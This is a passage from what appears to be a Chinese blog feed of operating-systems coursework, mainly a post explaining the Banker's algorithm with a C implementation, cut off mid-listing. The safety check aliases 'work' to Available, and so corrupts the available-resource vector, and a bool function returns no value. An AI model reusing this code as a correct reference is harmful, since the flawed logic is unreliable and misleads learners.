区</td></tr><tr><td>7ffd8000-7ffdf000</td><td>28.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr></tbody></table><p>表5-5已调配区虚拟地址空间实验记录</p><table><thead><tr><th>地址</th><th>大小</th><th>虚拟地址空间类型</th><th>访问权限</th><th>描述</th></tr></thead><tbody><tr><td>00010000-00020000</td><td>64.0KB</td><td>Committed</td><td>READWRITE</td><td>具有READWRITE权限的已调配Mapped内存区</td></tr><tr><td>00020000-00030000</td><td>64.0KB</td><td>Committed</td><td>READWRITE</td><td>具有READWRITE权限的已调配Mapped内存区</td></tr><tr><td>0012d000-0012e000</td><td>4.00KB</td><td>Committed</td><td>READWRITE</td><td>具有READWRITE权限的已调配私有内存区</td></tr><tr><td>0012e000-00130000</td><td>8.00KB</td><td>Committed</td><td>READWRITE</td><td>具有READWRITE权限的已调配Image内存区</td></tr><tr><td>00130000-00134000</td><td>16.0KB</td><td>Committed</td><td>READWRITE</td><td>具有READWRITE权限的已调配私有内存区</td></tr></tbody></table><p>表5-6保留区虚拟地址空间实验记录</p><table><thead><tr><th>地址</th><th>大小</th><th>虚拟地址空间类型</th><th>访问权限</th><th>描述</th></tr></thead><tbody><tr><td>00030000-0012d000</td><td>0.98MB</td><td>Reserved</td><td>READONLY</td><td>具有READONLY权限的已调配私有内存区</td></tr><tr><td>001c7000-00280000</td><td>740KB</td><td>Reserved</td><td>READONLY</td><td>具有READONLY权限的已调配私有内存区</td></tr><tr><td>00283000-00288000</td><td>20KB</td><td>Reserved</td><td>READONLY</td><td>具有READONLY权限的已调配私有内存区</td></tr><tr><td>00333000-00340000</td><td>52KB</td><td>Reserved</td><td>READONLY</td><td>具有READONLY权限的已调配Mapped内存区</td></tr><tr><td>0065f000-00740000</td><td>900KB</td><td>Reserved</td><td>READONLY</td><td>具有READONLY权限的已调配Mapped内存区</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>银行家算法的模拟与实现</title>
      <link href="/2021/06/22/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95%E7%9A%84%E6%A8%A1%E6%8B%9F%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/06/22/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95%E7%9A%84%E6%A8%A1%E6%8B%9F%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在这漫长的人生旅途中，我们总会遇到荆棘，难以逾越。有人选择放弃，有人忍痛前行。虽然两者并无高下之分，但我还是希望自己能够选择后者，无畏艰险，至死不渝。</p><h3 id="银行家算法的模拟与实现"><a href="#银行家算法的模拟与实现" class="headerlink" title="银行家算法的模拟与实现"></a>银行家算法的模拟与实现</h3><p>(1) 进一步理解进程的并发执行。<br>(2) 加强对进程死锁的理解，理解安全状态与不安全状态的概念。<br>(3) 掌握使用银行家算法避免死锁问题。</p><ol><li><p>基本概念</p><ul><li>死锁：多个进程在执行过程中，因为竞争资源会造成相互等待的局面。如果没有外力作用，这些进程将永远无法向前推进。此时称系统处于死锁状态或者系统产生了死锁。</li><li>安全序列：系统按某种顺序并发进程，并使它们都能达到获得最大资源而顺序完成的序列为安全序列。</li><li>安全状态：能找到安全序列的状态称为安全状态，安全状态不会导致死锁。</li><li>不安全状态：在当前状态下不存在安全序列，则系统处于不安全状态。</li></ul></li><li><p>银行家算法</p><p>银行家算法顾名思义是来源于银行的借贷业务，一定数量的本金要满足多个客户的借贷周转，为了防止银行家资金无法周转而倒闭，对每一笔贷款，必须考察其是否能限期归还。在操作系统中研究资源分配策略时也有类似问题，系统中有限的资源要供多个进程使用，必须保证得到的资源的进程能在有限的时间内归还资源，以供其它进程使用资源。如果资源分配不当，就会发生进程循环等待资源，则进程都无法继续执行下去的死锁现象。</p></li><li><p>当一进程提出资源申请时，银行家算法执行下列步骤以决定是否向其分配资源：<br>1）检查该进程所需要的资源是否已超过它所宣布的最大值。<br>2）检查系统当前是否有足够资源满足该进程的请求。<br>3）系统试探着将资源分配给该进程，得到一个新状态。<br>4）执行安全性算法，若该新状态是安全的，则分配完成；若新状态是不安全的，则恢复原状态，阻塞该进程。</p></li><li><p>本实验的内容是要通过编写和调试一个模拟系统动态分配资源的银行家算法程序，有效地避免死锁发生。具体要求如下：<br>（1） 初始化时让系统拥有一定的资源；<br>（2） 用键盘输入的方式允许进程动态申请资源；<br>（3） 如果试探分配后系统处于安全状态，则修改系统的资源分配情况，正式分配资源；<br>（4） 如果试探分配后系统处于不安全状态，则提示不能满足请求，恢复原状态并阻塞该进程。</p></li></ol><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><strong>进程个数n</strong><br><strong>资源类数m</strong><br><strong>可利用资源向量Available</strong><br>含有m个元素的数组，其中的每一个元素代表一类可利用的资源数目。如果Available[j]=K，则表示系统中现有Rj类资源K个。<br><strong>最大需求矩阵Max</strong><br>n×m的矩阵，它定义了系统中n个进程中的每一个进程对m类资源的最大需求。如果Max[i,j]=K，则表示进程i需要Rj类资源的最大数目为K。<br><strong>分配矩阵Allocation</strong><br>n×m的矩阵，它定义了系统中每一类资源当前已分配给每一进程的资源数。如果Allocation[i,j]=K，则表示进程i当前已分得Rj类资源的 数目为K。<br><strong>需求矩阵Need</strong><br>n×m的矩阵，用以表示每一个进程尚需的各类资源数。如果Need[i,j]=K，则表示进程i还需要Rj类资源K个，方能完成其任务。<br>Need[i,j]=Max[i,j]-Allocation[i,j]</p><h3 id="安全检查算法"><a href="#安全检查算法" class="headerlink" title="安全检查算法"></a>安全检查算法</h3><ol><li>设置两个工作向量<br>Work 记录系统当前可用资源量，初值为Available;<br>finish 记录所有进程是否已被执行, 初值为长度为n，值均为False的向量。</li><li>从进程集合中找到一个满足下述条件的进程，<br>finish == False;<br>Need &lt;= Work;<br>如找到，执行3；否则，执行4。</li><li>假设进程获得资源，可顺利执行，直至完成，从而释放资源。<br>Work += Allocation;<br>Finish=True;<br>执行2</li><li>如所有的进程finish= True，则表示安全；否则系统不安全。</li></ol><h3 id="算法流程图"><a href="#算法流程图" class="headerlink" title="算法流程图"></a>算法流程图</h3><p><img src="/images/OS/banker_flush_chart.png" alt="图1"></p><h3 id="具体设计"><a href="#具体设计" class="headerlink" title="具体设计"></a>具体设计</h3><p>首先，将需要的变量定义为全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> n;  <span class="hljs-comment">//进程数</span><br><span class="hljs-keyword">int</span> m;  <span class="hljs-comment">//资源类数</span><br><span class="hljs-keyword">int</span> *Available; <span class="hljs-comment">//可使用资源向量</span><br><span class="hljs-keyword">int</span> **Max;  <span class="hljs-comment">//最大需求矩阵</span><br><span class="hljs-keyword">int</span> **Allocation;    <span class="hljs-comment">//分配矩阵</span><br><span class="hljs-keyword">int</span> **Need; <span class="hljs-comment">//需求矩阵</span><br><span class="hljs-keyword">bool</span> safe = False;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> id;  <span class="hljs-comment">//进程ID</span><br>    <span class="hljs-keyword">int</span> *req_src;  <span class="hljs-comment">//进程此次申请资源</span><br>&#125;Request;<br>Request* new_request;<br></code></pre></td></tr></table></figure><p>如上，用到了Bool型变量，因此要定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> True 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> False 0</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> <span class="hljs-keyword">bool</span>;<br></code></pre></td></tr></table></figure><p>下面列出了我们将要写的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initial</span><span class="hljs-params">()</span></span>;            <span class="hljs-comment">//初始化n,m,Available等的函数  </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//提出请求</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//处理</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">safe_detect</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//安全性检测</span><br><span class="hljs-comment">/*向量运算函数*/</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">vector_compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span></span>;  <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span></span>;<br></code></pre></td></tr></table></figure><p>首先给出几个向量运算函数的定义：<br>定义a和b为两个等长向量,<br>a &gt;= b 表示 a 中的每个元素都大于相应位置上的 b 的元素；<br>a += b 表示 a 中的每个元素增加相应位置上的 b 的元素的值；<br>a -= b 表示 a 中的每个元素都大于相应位置上的 b 的元素的值；<br>例：<br>a = [1,2,3];<br>b = [1,1,1];<br>则<br>a &gt;= b;<br>a += b; //a=[2,3,4]<br>a -= b; //a=[0,1,2]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">vector_compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span>    <span class="hljs-comment">// If vector a &gt;= vector b, return True</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;len)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(*(a+i)&lt;*(b+i))<br>            <span class="hljs-keyword">return</span> False;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> True;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span> <span class="hljs-comment">//vector a += vector b</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;len)<br>    &#123;<br>        *(a+i) += *(b+i);<br>        i++;<br>    &#125; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span> <span class="hljs-comment">//vector a -= vector b</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;len)<br>    &#123;<br>        *(a+i) -= *(b+i);<br>        i++;<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>下面按算法步骤给出 initial(), request(), process(), safe_request()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initial</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> j;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入进程数:\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入资源类数:\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;m);    <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入可使用资源向量:\n&quot;</span>);<br>    Available = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;Available[i]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入最大需求矩阵:\n&quot;</span>);<br>    Max = (<span class="hljs-keyword">int</span>**)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>*)*n);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>    &#123;<br>        Max[i] = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;m; j++)<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;Max[i][j]);<br>    &#125;<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入分配矩阵:\n&quot;</span>);<br>    Allocation = (<span class="hljs-keyword">int</span>**)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>*)*n);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>    &#123;<br>        Allocation[i] = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;m; j++)<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;Allocation[i][j]);<br>    &#125;<br><br>    Need = (<span class="hljs-keyword">int</span>**)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>*)*n);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        Need[i] = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;m;j++)<br>            Need[i][j] = Max[i][j] - Allocation[i][j];<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i,id;<br>    new_request = (Request*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Request));<br>    new_request-&gt;req_src = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入进程的ID\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;id);<br>    new_request-&gt;id = id - <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入进程申请资源向量\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;new_request-&gt;req_src[i]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = new_request-&gt;id;<br>    <span class="hljs-keyword">if</span>(vector_compare(Need[i],new_request-&gt;req_src,m))<br>        &#123;<br>            <span class="hljs-keyword">if</span>(vector_compare(Available,new_request-&gt;req_src,m))<br>            &#123;<br>                vector_sub(Available,new_request-&gt;req_src,m);<br>                vector_add(Allocation[i],new_request-&gt;req_src,m);<br>                vector_sub(Need[i],new_request-&gt;req_src,m);<br>                safe_detect();<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;程序所申请资源大于系统当前所剩资源，推迟执行!\n&quot;</span>);  <br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>                              <br>        &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;程序所申请资源大于该程序所需资源，无法执行!\n&quot;</span>); <br>        <span class="hljs-keyword">return</span>;<br>    &#125;    <br>    <span class="hljs-keyword">if</span>(safe)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;系统安全,进程可以执行!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;系统不安全,进程无法执行!\n&quot;</span>);<br>        vector_add(Available,new_request-&gt;req_src,m);<br>        vector_sub(Allocation[i],new_request-&gt;req_src,m);<br>        vector_add(Need[i],new_request-&gt;req_src,m);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>        <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">safe_detect</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> *work = Available;<br>    <span class="hljs-keyword">bool</span> *finish = (<span class="hljs-keyword">bool</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">bool</span>)*n);<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-comment">//初始化finish</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>        finish[i] = False;<br>    <br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(finish[i]==False&amp;&amp;vector_compare(work,Need[i],m))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;尝试执行第%d进程\n&quot;</span>,i+<span class="hljs-number">1</span>);<br>            vector_add(work,Allocation[i],m);   <span class="hljs-comment">//尝试执行该进程，释放资源</span><br><br>            finish[i] = True;<br>            i = <span class="hljs-number">-1</span>;  <span class="hljs-comment">//尝试分配后，从头查找是否还有可以执行的进程，考虑到i++，故此处为-1</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>        <span class="hljs-keyword">if</span>(finish[i]==False)<br>            <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span>(i==n)<br>        safe = True;<br>    <span class="hljs-keyword">else</span><br>        safe = False;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实现完整源码"><a href="#实现完整源码" class="headerlink" title="实现完整源码"></a>实现完整源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> True 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> False 0</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> <span class="hljs-keyword">bool</span>;<br><br><span class="hljs-keyword">int</span> n;  <span class="hljs-comment">//进程数</span><br><span class="hljs-keyword">int</span> m;  <span 